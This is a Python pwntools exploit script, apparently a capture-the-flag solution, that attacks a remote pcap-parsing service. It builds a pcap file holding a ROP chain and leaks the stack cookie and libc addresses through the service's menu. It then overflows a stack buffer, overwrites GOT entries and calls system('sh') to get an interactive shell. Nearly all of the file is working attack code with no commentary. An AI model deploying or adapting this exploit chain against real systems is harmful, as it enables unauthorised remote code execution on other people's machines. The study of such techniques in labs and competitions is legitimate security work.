import pwn
import time
import scapy.all

pcap = ""
pcap += pwn.p32(0xa1b2c3d4) # PCAP magic
pcap += pwn.p16(2) # PCAP 2.4
pcap += pwn.p16(4) 
pcap += pwn.p32(0) # UTC
pcap += pwn.p32(0) # sigfigs
pcap += pwn.p32(65535) # caplen
pcap += pwn.p32(1) # ethernet

def add_packet_header(sl, l):
    global pcap
    pcap += pwn.p32(int(time.time()))
    pcap += pwn.p32(0)
    pcap += pwn.p32(sl)
    pcap += pwn.p32(l)


# 0x00402083: pop rdi ; ret  ;  (1 found)
POP_RDI = 0x00402083
# 0x00402081: pop rsi ; pop r15 ; ret  ;  (1 found)
POP_RSI_R15 = 0x00402081
# 0x0040207d: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
POP_RSP = 0x0040207d
# 0x00400ed8: pop rbp ; ret  ;  (1 found)
POP_RBP = 0x00400ed8
# 0x00402080: pop r14 ; pop r15 ; ret  ;  (1 found)
POP_POP_RET = 0x00402080

# mov rdi, "\tHeader Length: %d\n", call _printf
PRINTF_PD = 0x4011C3

PRINTF = 0x400CD0
PRINTF_GOT_PLT = 0x603068
PCAP_OPEN_OFFLINE_GOT_PLT = 0x603098
ATOI_GOT_PLT = 0x6030f0
FREAD = 0x400C70
NTOHL = 0x400e10
ATOI = 0x400DE0
SPRINTF = 0x400DF0

# \tVersion: %d\n
STR_VERSION_PS = 0x4020EE

STR_SH = 0x6032C0

rop_s2 = ""
rop_s2 += pwn.cyclic(3*8)
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(NTOHL)
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(STR_VERSION_PS)
rop_s2 += pwn.p64(POP_RSI_R15)
rop_s2 += pwn.p64(PRINTF_GOT_PLT)
rop_s2 += pwn.p64(0x0)
rop_s2 += pwn.p64(PRINTF)

rop_s2 += pwn.p64(0x401E14)

rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(ATOI_GOT_PLT)
rop_s2 += pwn.p64(POP_RSI_R15)
rop_s2 += pwn.p64(0x6032C0)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(SPRINTF)

rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(NTOHL)

rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(ATOI_GOT_PLT+4)
rop_s2 += pwn.p64(POP_RSI_R15)
rop_s2 += pwn.p64(0x402516)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(SPRINTF)

rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(ATOI_GOT_PLT+5)
rop_s2 += pwn.p64(POP_RSI_R15)
rop_s2 += pwn.p64(0x402516)
rop_s2 += pwn.p64(0)
rop_s2 += pwn.p64(SPRINTF)

rop_s2 += pwn.p64(POP_RBP)
rop_s2 += pwn.p64(PCAP_OPEN_OFFLINE_GOT_PLT + 0x20)
rop_s2 += pwn.p64(0x401A87) # fgets/atoi trick
rop_s2 += pwn.p64(POP_RDI)
rop_s2 += pwn.p64(STR_SH+4)
rop_s2 += pwn.p64(0x400d30)
rop_s2 += pwn.p64(0x401E14)


p = scapy.all.Ether(dst="00:11:22:33:44:55", src="00:11:22:33:44:66")/ \
    scapy.all.IP(dst="10.0.0.2", src="10.0.0.1", len=1000)/ \
    scapy.all.TCP(dport=80, sport=12345)/ \
    ("foobarbazz" + rop_s2)
p = bytes(p)
add_packet_header(len(p), 180)
pcap += p

r = pwn.remote('200.200.200.5', 9998)
r.recvuntil("size: ")
r.send(str(len(pcap)) + '\n')
r.recvuntil('\n')
r.send(pcap)


pwn.log.info("Running info leak...")
r.recvuntil('>> ')
r.send('6\n')
r.recvuntil("<Payload>\n")
byte_dump = r.recvuntil('>> ')
print byte_dump.split('\n\n')[0]
cookie_line = byte_dump.split('\n')[20]
cookie = pwn.u64((''.join(cookie_line.split()[18:18+8])).decode('hex'))
pwn.log.info("Cookie: %016x", cookie)

stack_line = byte_dump.split('\n')[4]
stack_v = pwn.u64((''.join(stack_line.split()[18:18+8])).decode('hex'))
pwn.log.info("Stack value: %016x", stack_v)

tcp_buffer = stack_v + 0x320 + 8
pwn.log.info("TCP bytes at %016x", tcp_buffer)

pwn.log.info("Smashing stack with search payload...")
r.send('5\n')
r.recvuntil(':')

payload = ""
payload += pwn.cyclic(24) # buffer
payload += pwn.p64(cookie) # stack cookie
payload += pwn.p64(0xDEADBEEF)
payload += pwn.p64(POP_RSP)
payload += pwn.p64(tcp_buffer)

assert '\n' not in payload
print len(payload)
assert len(payload) <= 72

# 00000000000544f0 g    DF .text    00000000000000a1  GLIBC_2.2.5 printf
# [*] printf.got.plt is 00007fc594a424f0
LIBC_PRINTF = 0x00000000000544f0

r.send(payload + '\n')
print "fuuuuck",  r.recvuntil('>> ')
r.send('7\n')

r.recvuntil('IP: ')
printf_got = pwn.u64(r.recvuntil("\n")[:8].rstrip('\n').ljust(8, "\x00"))
pwn.log.info("printf.got.plt is %016x", printf_got)

libc_base = printf_got - LIBC_PRINTF
pwn.log.info("libc is at %016x", libc_base)

# 0000000000044c40  w   DF .text    000000000000002d  GLIBC_2.2.5 system
system = libc_base + 0x0000000000044c40

r.send('0\n')

print r.recvuntil('>>')
pwn.log.info("Setting src port to sh\\x00\\x00")
r.send('1\n')
print r.recvuntil(': ')
r.send('.'.join(str(ord(c)) for c in pwn.pack(POP_RDI)) + '\n')

print r.recvuntil('>>')
pwn.log.info("Setting dst port to sh\\x00\\x00")
r.send('2\n')
print r.recvuntil(': ')
r.send('.'.join(str(ord(c)) for c in "sh\x00\x00") + '\n')

r.send('7\n')
print r.recv(1024)

r.send(pwn.p64(system) + "\n")
r.interactive()
